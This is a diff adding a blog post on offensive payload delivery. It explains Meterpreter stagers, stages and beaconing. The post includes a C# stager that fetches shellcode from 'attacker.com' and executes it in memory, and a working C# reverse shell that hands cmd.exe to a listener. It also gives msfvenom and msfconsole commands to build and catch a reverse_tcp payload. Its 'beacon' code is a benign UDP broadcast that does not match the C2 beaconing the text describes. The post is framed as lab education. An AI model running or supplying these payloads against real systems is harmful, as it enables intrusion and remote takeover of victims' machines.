@@ -1,0 +1,388 @@
+---
+title: 'Hook, Line and Sinker - Payload Delivery'
+date: '2024-02-27'
+category:
+  - 'security'
+  - 'offensive'
+tags:
+  - 'meterpreter'
+  - 'c#'
+  - 'off-security'
+summary: In this blog post, I will explain how payloads work in the context of penetration testing and ethical hacking. I will focus on the Meterpreter payload, which is a powerful and versatile tool for post-exploitation. I will also cover the concepts of stagers, stages and beacons, and how they are used to deliver and execute payloads on target systems. Finally, I will show some examples of how to write stagers and stages in C#, and how to create beacons using the Metasploit Framework.
+coverImage: '/static/images/marc-olivier-jodoin.jpg'
+---
+
+In the cybersecurity landscape, understanding the intricacies of payloads is vital. This blog post aims to provide a detailed exploration of the lifecycle of a Meterpreter shell. We will delve into the concepts of a stager and stage, and illustrate their implementation in C#. Additionally, we will shed light on the concept of a beacon and its C# representation. This post is intended to be highly descriptive and technical, catering to those seeking a thorough understanding of these concepts.
+
+## Payloads: A Brief Overview
+
+In the context of cybersecurity, a payload refers to the part of the malware that carries out a malicious task. It could range from activities like data theft to causing damage to the system. However, the payload requires a delivery mechanism to reach the target system. This is where the stager and stage come into play.
+
+## Stager and Stage(s): A Closer Look
+
+### Stagers: The Silent Couriers
+
+1. **What Is a Stager?**
+   - A **stager** is akin to a discreet courier that facilitates the initial contact between the attacker and the victim.
+   - Its primary purpose is to **establish a connection** with the compromised system.
+   - Unlike the more elaborate payload (the stage), a stager is lightweight and inconspicuous.
+
+2. **Delivery Mechanism**:
+   - Imagine a covert operative slipping a coded message under the door—a stager performs a similar function.
+   - It delivers just enough functionality to create a communication channel.
+   - Stagers are often used when the available buffer space for the payload is limited or when stealth is paramount.
+
+3. **Types of Stagers**:
+   - **Reverse TCP Stager**: Initiates an outbound connection from the victim to the attacker.
+   - **HTTP Stager**: Fetches the next stage over HTTP.
+   - **DNS Stager**: Uses DNS queries to retrieve subsequent payloads.
+   - **Stageless Stagers**: Combine the stager and stage into a single payload.
+
+### Stages: The Payload Unleashed
+
+1. **What Is a Stage?**
+   - The **stage** is the heart of the operation—the payload that executes the desired actions on the compromised system.
+   - It can be a fully functional shell, a keylogger, a file downloader, or any other malicious capability.
+   - Unlike the stager, which is minimalistic, stages are feature-rich and tailored to the attacker's objectives.
+
+2. **Downloading and Execution**:
+   - Once the stager establishes contact, it fetches the stage from the attacker's server.
+   - The stage is then executed on the victim's machine.
+   - Stages can be modular, allowing customization with different options and features.
+
+3. **Persistence and Functionality**:
+   - Stages persist beyond the initial connection.
+   - They maintain access, evade detection, and perform ongoing tasks.
+   - Examples include maintaining a reverse shell, exfiltrating data, or launching additional attacks.
+
+### The Dance of Deception
+
+1. **Why the Separation?**
+   - **Stealth**: By separating the stager and stage, attackers minimize their footprint during initial compromise.
+   - **Adaptability**: Stagers can switch communication protocols dynamically.
+   - **Indirection**: The stager acts as a buffer, shielding the more critical stage from immediate scrutiny.
+
+2. **Detection Challenges**:
+   - Detecting stagers is difficult due to their simplicity and brevity.
+   - Stages, being more substantial, are the real targets for detection mechanisms.
+
+Here's a rudimentary example of a stager in C#:
+
+```csharp
+using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+
+public class Program
+{
+    private static UInt32 MEM_COMMIT = 0x1000;
+    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    [DllImport("kernel32")]
+    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+    [DllImport("msvcrt")]
+    private static extern IntPtr memset(IntPtr dest, UInt32 src, UInt32 count);
+
+    public static void Main()
+    {
+        byte[] shellcode = ConnectAndDownloadShellcode("attacker.com", 4444);
+
+        if (shellcode != null)
+        {
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+        }
+    }
+
+    private static byte[] ConnectAndDownloadShellcode(string server, int port)
+    {
+        using (TcpClient client = new TcpClient(server, port))
+        {
+            byte[] shellcode = new byte[1024];
+
+            using (NetworkStream stream = client.GetStream())
+            {
+                int bytesRead = 0;
+                int read = 0;
+
+                do
+                {
+                    read = stream.Read(shellcode, bytesRead, shellcode.Length - bytesRead);
+                    bytesRead += read;
+                } while (read > 0);
+            }
+
+            return shellcode;
+        }
+    }
+}
+```
+
+In this example, the `ConnectAndDownloadShellcode` function connects to the attacker's server and downloads the Meterpreter stage (the shellcode). The `Main` function then allocates memory for the shellcode, copies the shellcode into the allocated memory, and creates a new thread to execute the shellcode.
+
+
+## The Lifecycle of a Shell
+### Standard Reverse Shell
+A reverse shell works by creating a connection from the target system to the attacker’s machine, where the attacker can send commands and receive the output. A reverse shell can be useful for bypassing firewall rules, gaining access to protected networks, or performing post-exploitation actions.
+
+Below is a basic example of a reverse shell written in C#: 
+```csharp
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace ShellExample
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Set your listener IP and port
+            string listenerIp = "192.168.1.228";
+            int listenerPort = 443;
+
+            // Create a reverse shell to the listener
+            ReverseShell(listenerIp, listenerPort);
+        }
+
+        static void ReverseShell(string ip, int port)
+        {
+            try
+            {
+                using (TcpClient client = new TcpClient(ip, port))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        StreamReader reader = new StreamReader(stream);
+                        StreamWriter writer = new StreamWriter(stream);
+
+                        Process process = new Process();
+                        process.StartInfo.FileName = "cmd.exe";
+                        process.StartInfo.CreateNoWindow = true;
+                        process.StartInfo.UseShellExecute = false;
+                        process.StartInfo.RedirectStandardInput = true;
+                        process.StartInfo.RedirectStandardOutput = true;
+                        process.StartInfo.RedirectStandardError = true;
+
+                        process.OutputDataReceived += (sender, e) =>
+                        {
+                            writer.WriteLine(e.Data);
+                            writer.Flush();
+                        };
+
+                        process.ErrorDataReceived += (sender, e) =>
+                        {
+                            writer.WriteLine(e.Data);
+                            writer.Flush();
+                        };
+
+                        process.Start();
+                        process.BeginOutputReadLine();
+                        process.BeginErrorReadLine();
+
+                        string cmd;
+                        while ((cmd = reader.ReadLine()) != null)
+                        {
+                            process.StandardInput.WriteLine(cmd);
+                            process.StandardInput.Flush();
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+        }
+    }
+}
+```
+
+In this example:
+- Replace `listenerIp` and `listenerPort` with your actual listener details.
+- The program establishes a reverse shell to the specified listener.
+- When executed on the target system, it connects back to your listener, allowing you to interact with the shell.
+
+Remember that real-world scenarios require additional features like encryption, obfuscation, and error handling.
+
+### Meterpreter shelling
+A Meterpreter shell is a dynamic payload in Metasploit. It provides the attacker with a broad range of capabilities on the target system, such as data theft, capturing screenshots, and gaining complete control over the system.
+The shell in this case has many advanced features over a regular shell and makes interacting with the target easier and more stable.
+
+The lifecycle of a Meterpreter shell can be broken down into the following steps:
+
+1. **Delivery**: The stager is delivered to the target system via an exploit or attack vector.
+2. **Connection**: The stager establishes a connection back to the attacker's machine.
+3. **Download**: The stager downloads the Meterpreter stage from the attacker's machine.
+4. **Execution**: The Meterpreter stage is executed on the target system, providing the attacker with a fully-featured shell.
+
+A basic shell can be created using `msfvenom` like below: 
+```shll
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe > shell.exe
+```
+Mind you this is going to be detected by pretty much any AV on the market and evading this detection is the topic for another post. For now just understand the basics of generating a shell.
+
+With the shell created we would need to establish a listner such as: 
+
+```shell
+msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <your_IP>; set LPORT <your_port>; exploit'
+```
+
+A neat tip here is to use your interface name, such as `eth0`, rather than providing `LHOST=###.###.###.###` every time for instance:
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=1337 -f exe > shell.exe
+msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 1337; exploit'
+```
+
+
+## Beaconing: An In-Depth Look
+
+**Beaconing** is a critical technique used by malware to establish communication with its **command and control (C2) server**. It serves as both a **signal of presence** and a **channel for receiving instructions**. Imagine it as the malware's discreet way of "phoning home."
+
+### Understanding the Basics
+
+1. **What Is a Beacon?**
+   - A **beacon** is a lightweight, low-profile component embedded within the malware.
+   - Its primary purpose is to **check in** with the C2 server at regular intervals.
+   - Unlike a loud and persistent connection, a beacon operates quietly, minimizing detection risk.
+
+2. **Why Use Beacons?**
+   - **Stealth**: Malware authors want to avoid detection by security tools and analysts.
+   - **Resilience**: If one beacon is compromised, others can still function.
+   - **Adaptability**: Beacons can switch communication protocols (HTTP, DNS, etc.) dynamically.
+   - **Indirection**: Separating the initial compromise from ongoing communication enhances operational security.
+
+### Anatomy of a Beacon
+
+1. **Initialization**:
+   - When the malware infects a system, it initializes the beacon.
+   - The beacon generates a **unique identifier** (often a GUID) to distinguish itself.
+
+2. **Communication Channels**:
+   - **HTTP Beacon**: Sends HTTP requests to the C2 server.
+   - **DNS Beacon**: Uses DNS queries to encode and transmit data.
+   - **TCP/UDP Beacons**: Communicate directly over network sockets.
+   - **Domain Fronting**: Hides communication within legitimate domains (e.g., Google).
+
+3. **Beaconing Intervals**:
+   - Beacons check in at **predetermined intervals** (e.g., every 5 minutes).
+   - Longer intervals reduce detection chances but increase response time for attackers.
+
+4. **Data Exfiltration**:
+   - Beacons transmit information such as system details, stolen credentials, or task requests.
+   - Encrypted payloads prevent easy analysis.
+
+5. **Tasking and Payloads**:
+   - The C2 server sends tasks to the beacon (e.g., execute a command, download a file).
+   - Payloads are often **staged** (split into smaller chunks) to avoid detection.
+
+### Beacon Variants
+
+1. **Single-Use Beacons**:
+   - Used once and discarded after the initial compromise.
+   - Minimizes risk but requires recompromise for further access.
+
+2. **Sticky Beacons**:
+   - Persist across reboots or network changes.
+   - Maintain a foothold even if the original compromise is lost.
+
+3. **Sleeping Beacons**:
+   - Enter a dormant state to avoid detection.
+   - Wake up periodically to check in.
+
+### Detection and Mitigation
+
+1. **Behavioral Analysis**:
+   - Monitor network traffic for suspicious patterns.
+   - Look for irregular beaconing intervals or unexpected communication channels.
+
+2. **Signature-Based Detection**:
+   - Identify known beaconing patterns.
+   - Requires regular signature updates.
+
+3. **Blocking Known C2 Servers**:
+   - Deny communication with known malicious domains.
+
+
+```csharp
+using System;
+using System.Net;
+using System.Net.Sockets;
+
+namespace BeaconExample
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Define your application-specific beacon data
+            string beaconData = "My Application Server on " + Dns.GetHostName();
+            int portNumber = 1234; // Port clients should connect to
+
+            // Start the beacon
+            var beacon = new Beacon("myApp", portNumber);
+            beacon.BeaconData = beaconData;
+            beacon.Start();
+
+            Console.WriteLine("Beacon started. Press Enter to stop...");
+            Console.ReadLine();
+
+            // Stop the beacon
+            beacon.Stop();
+        }
+    }
+
+    // Simple Beacon class
+    class Beacon
+    {
+        private UdpClient udpClient;
+        private string applicationType;
+
+        public string BeaconData { get; set; }
+
+        public Beacon(string applicationType, int port)
+        {
+            this.applicationType = applicationType;
+            udpClient = new UdpClient(port);
+        }
+
+        public void Start()
+        {
+            // Broadcast the beacon data
+            byte[] data = System.Text.Encoding.UTF8.GetBytes(BeaconData);
+            udpClient.Send(data, data.Length, new IPEndPoint(IPAddress.Broadcast, 1234));
+        }
+
+        public void Stop()
+        {
+            udpClient.Close();
+        }
+    }
+}
+```
+
+In this example:
+- The `Beacon` class encapsulates the beacon functionality.
+- It broadcasts the `BeaconData` (your server's description) over UDP.
+- Clients can discover the server by listening for these broadcasts.
+
+## Wrapping Up
+
+Understanding the inner workings of stagers, stages, and beacons is fundamental to both conducting penetration tests and defending against malicious attacks. By studying these concepts and examining real-world examples, we can gain a deeper understanding of the tactics, techniques, and procedures used by attackers, and be better prepared to protect our systems and data.
+
+Remember, the best way to learn is by doing. Try to implement these concepts in a controlled, ethical environment, such as a penetration testing lab. 
+
+-- Happy learning!
